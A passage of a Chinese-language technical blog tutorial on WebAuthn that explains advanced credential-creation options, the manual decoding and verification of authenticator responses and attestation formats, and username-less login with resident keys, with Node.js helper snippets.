WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 